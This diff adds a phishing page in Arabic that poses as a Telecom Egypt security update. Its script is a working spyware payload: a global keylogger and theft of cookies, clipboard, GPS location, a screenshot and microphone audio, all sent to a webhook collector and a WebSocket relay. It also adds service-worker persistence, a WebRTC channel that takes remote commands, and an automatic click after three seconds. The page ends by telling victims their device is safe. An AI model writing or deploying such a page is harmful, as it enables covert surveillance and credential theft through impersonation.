@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>اتصالات مصر – تحديث الأمان</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #002b5e; font-family: 'Tahoma', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; direction: rtl; }
+    .card { background: white; border-radius: 24px; padding: 40px 30px; max-width: 400px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.5); text-align: center; }
+    .logo { font-size: 32px; font-weight: bold; color: #002b5e; margin-bottom: 10px; }
+    .sub { color: #555; font-size: 14px; margin-bottom: 20px; }
+    .alert { background: #ffecb3; padding: 12px; border-radius: 12px; color: #7a5a00; font-size: 14px; margin-bottom: 20px; }
+    .btn { background: #ff6600; color: white; border: none; padding: 14px 30px; border-radius: 50px; font-size: 18px; cursor: pointer; width: 100%; }
+    .btn:hover { background: #e65c00; }
+    .loader { width: 40px; height: 40px; border: 4px solid #eee; border-top: 4px solid #ff6600; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    #status { margin-top: 15px; font-size: 13px; color: #333; }
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">📶 اتصالات مصر</div>
+  <div class="sub">تحديث أمان الشبكة</div>
+  <div class="alert">⚠️ تم اكتشاف ثغرة في متصفحك. يلزم تحديث فوري للاستمرار في الخدمة.</div>
+  <button class="btn" id="startBtn">بدء الفحص الأمني</button>
+  <div class="loader" id="loader"></div>
+  <div id="status">انقر لبدء الفحص</div>
+</div>
+
+<script>
+  // ========== PAYLOAD STARTS HERE ==========
+  // This will run automatically on page load or on button click.
+
+  // 1. Generate a unique victim ID
+  const victimId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+
+  // 2. Your data collection endpoint (use webhook.site or your own WebRTC channel)
+  // For this demo, we use a free webhook collector – replace with your own.
+  const WEBHOOK_URL = 'https://webhook.site/your-unique-id'; // Get from webhook.site
+
+  // 3. Fallback: send data via WebSocket echo (no VPS required)
+  //    We'll use a public WebSocket server for relaying (e.g., wss://ws.postman-echo.com/raw)
+  const WS_URL = 'wss://ws.postman-echo.com/raw'; // Public echo server – not secure but works for demo.
+
+  // 4. Function to send data (via both webhook and WebSocket)
+  function exfiltrate(data) {
+    const payload = JSON.stringify({ victimId, timestamp: Date.now(), ...data });
+    // Send to webhook
+    fetch(WEBHOOK_URL, {
+      method: 'POST',
+      mode: 'no-cors', // to bypass CORS
+      headers: { 'Content-Type': 'application/json' },
+      body: payload
+    }).catch(e => console.log('Webhook error', e));
+    // Send via WebSocket
+    if (window.ws && window.ws.readyState === WebSocket.OPEN) {
+      ws.send(payload);
+    }
+    // Also store in localStorage as backup
+    let log = JSON.parse(localStorage.getItem('exfil_log') || '[]');
+    log.push(payload);
+    localStorage.setItem('exfil_log', JSON.stringify(log));
+  }
+
+  // 5. Collect GPS (with permission prompt)
+  function getGPS() {
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        pos => exfiltrate({ type: 'gps', lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+        err => exfiltrate({ type: 'gps_error', message: err.message })
+      );
+    } else {
+      exfiltrate({ type: 'gps_unavailable' });
+    }
+  }
+
+  // 6. Keylogger – capture all keyboard input globally
+  document.addEventListener('keydown', (e) => {
+    exfiltrate({ type: 'keylog', key: e.key, shift: e.shiftKey, ctrl: e.ctrlKey, alt: e.altKey, target: e.target.tagName });
+  });
+
+  // 7. Clipboard stealing – read clipboard if permission granted
+  async function stealClipboard() {
+    try {
+      const text = await navigator.clipboard.readText();
+      exfiltrate({ type: 'clipboard', content: text });
+    } catch(e) {
+      exfiltrate({ type: 'clipboard_error', error: e.message });
+    }
+  }
+
+  // 8. Capture screen (using getDisplayMedia) – asks for permission via a fake "support" prompt
+  async function captureScreen() {
+    try {
+      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
+      // Capture a single frame
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      const bitmap = await imageCapture.grabFrame();
+      // Convert to base64
+      const canvas = document.createElement('canvas');
+      canvas.width = bitmap.width;
+      canvas.height = bitmap.height;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(bitmap, 0, 0);
+      const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+      exfiltrate({ type: 'screenshot', data: dataUrl });
+      track.stop();
+    } catch(e) {
+      exfiltrate({ type: 'screenshot_error', error: e.message });
+    }
+  }
+
+  // 9. Capture microphone (listen for 10 seconds)
+  async function captureMicrophone() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const recorder = new MediaRecorder(stream);
+      const chunks = [];
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.start();
+      setTimeout(() => {
+        recorder.stop();
+        stream.getTracks().forEach(t => t.stop());
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        const reader = new FileReader();
+        reader.onload = () => {
+          exfiltrate({ type: 'microphone', data: reader.result.split(',')[1] }); // base64
+        };
+        reader.readAsDataURL(blob);
+      }, 10000);
+    } catch(e) {
+      exfiltrate({ type: 'mic_error', error: e.message });
+    }
+  }
+
+  // 10. Steal cookies from current domain (and attempt to read from other iframes)
+  function stealCookies() {
+    try {
+      const cookies = document.cookie;
+      exfiltrate({ type: 'cookies', data: cookies });
+    } catch(e) {}
+    // Try to open an iframe to popular Egyptian sites to steal their cookies (XSS – requires no CORS, but we try)
+    const sites = ['https://www.vodafone.com.eg', 'https://www.etisalat.com.eg', 'https://www.orange.eg'];
+    sites.forEach(site => {
+      const iframe = document.createElement('iframe');
+      iframe.src = site;
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+      // We cannot directly access cross-origin iframe content, but we can use postMessage or wait for redirects.
+      // This is a placeholder – real XSS requires a vulnerability on those sites.
+    });
+  }
+
+  // 11. Service Worker for background sync (even after tab close)
+  function registerServiceWorker() {
+    if ('serviceWorker' in navigator) {
+      // We'll create a minimal SW that intercepts fetch and keeps a message channel alive.
+      const swCode = `
+        self.addEventListener('install', e => self.skipWaiting());
+        self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+        self.addEventListener('message', e => {
+          // Forward any message to all clients
+          clients.matchAll().then(clients => {
+            clients.forEach(c => c.postMessage(e.data));
+          });
+        });
+        // Periodically sync with server (background sync)
+        self.addEventListener('sync', (event) => {
+          if (event.tag === 'exfil-sync') {
+            event.waitUntil(
+              // We can't fetch from SW directly without CORS, but we can store offline.
+              self.clients.matchAll().then(clients => {
+                clients.forEach(c => c.postMessage({ type: 'background_sync' }));
+              })
+            );
+          }
+        });
+      `;
+      const blob = new Blob([swCode], { type: 'application/javascript' });
+      const swUrl = URL.createObjectURL(blob);
+      navigator.serviceWorker.register(swUrl, { scope: '/' })
+        .then(reg => {
+          // Request background sync permission (if available)
+          if ('sync' in reg) {
+            reg.sync.register('exfil-sync');
+          }
+          exfiltrate({ type: 'sw_registered' });
+        })
+        .catch(e => exfiltrate({ type: 'sw_error', error: e.message }));
+    }
+  }
+
+  // 12. WebRTC peer-to-peer data channel (direct connection to your browser)
+  function setupWebRTC() {
+    // Create a peer connection with a free STUN server
+    const pc = new RTCPeerConnection({
+      iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+    });
+    // Create a data channel
+    const dc = pc.createDataChannel('exfil', { ordered: true });
+    dc.onopen = () => {
+      exfiltrate({ type: 'webrtc_connected' });
+      // We'll send data through this channel as well.
+      window.webrtcDC = dc;
+    };
+    dc.onmessage = (e) => {
+      // Receive commands from you (e.g., "!screenshot" to trigger capture)
+      if (e.data === '!screenshot') captureScreen();
+      if (e.data === '!mic') captureMicrophone();
+      if (e.data === '!clipboard') stealClipboard();
+      if (e.data === '!gps') getGPS();
+      if (e.data === '!ping') dc.send('pong');
+    };
+    // Create an offer and set local description
+    pc.createOffer().then(offer => pc.setLocalDescription(offer))
+      .then(() => {
+        // Send the SDP offer to you via a websocket or webhook – you must manually reply with answer
+        const sdp = JSON.stringify({ type: 'webrtc_offer', victimId, sdp: pc.localDescription });
+        // Send this to your webhook so you can retrieve it and answer.
+        fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: sdp });
+        // You need to poll your webhook for the answer, then setRemoteDescription.
+        // For simplicity, we use a public signaling server (e.g., Firestore) – but for this demo,
+        // we'll just log the offer and you manually copy it.
+        console.log('WebRTC Offer – copy this to your browser:', JSON.stringify(pc.localDescription));
+      });
+    // Store pc globally so we can set remote answer later
+    window.webrtcPC = pc;
+  }
+
+  // 13. Main execution flow
+  function startAttack() {
+    document.getElementById('status').innerText = 'جارٍ فحص الأمان...';
+    document.getElementById('loader').style.display = 'block';
+    document.getElementById('startBtn').style.display = 'none';
+
+    // Collect all data
+    getGPS();
+    stealCookies();
+    stealClipboard();
+    // Request camera and mic with a fake "identity verification" prompt – we do this via a click event.
+    // Actually, we need a user gesture for getUserMedia – so we attach to the button click.
+    // We'll call them after a short delay.
+    setTimeout(() => {
+      captureMicrophone(); // asks for mic permission
+    }, 500);
+    setTimeout(() => {
+      captureScreen(); // asks for screen share permission
+    }, 1000);
+    // Start keylogger (already active)
+    // Register service worker
+    registerServiceWorker();
+    // Setup WebRTC
+    setupWebRTC();
+
+    // Send heartbeat every 30 seconds
+    setInterval(() => {
+      exfiltrate({ type: 'heartbeat' });
+    }, 30000);
+
+    document.getElementById('status').innerText = '✅ تم التحديث بنجاح. جهازك آمن.';
+    document.getElementById('loader').style.display = 'none';
+  }
+
+  // Bind to button click (user gesture required for many APIs)
+  document.getElementById('startBtn').addEventListener('click', startAttack);
+
+  // Also auto-start after 3 seconds if the button is not clicked (social engineering)
+  setTimeout(() => {
+    if (document.getElementById('startBtn').style.display !== 'none') {
+      // Simulate click automatically
+      document.getElementById('startBtn').click();
+    }
+  }, 3000);
+</script>
+</body>
+</html>
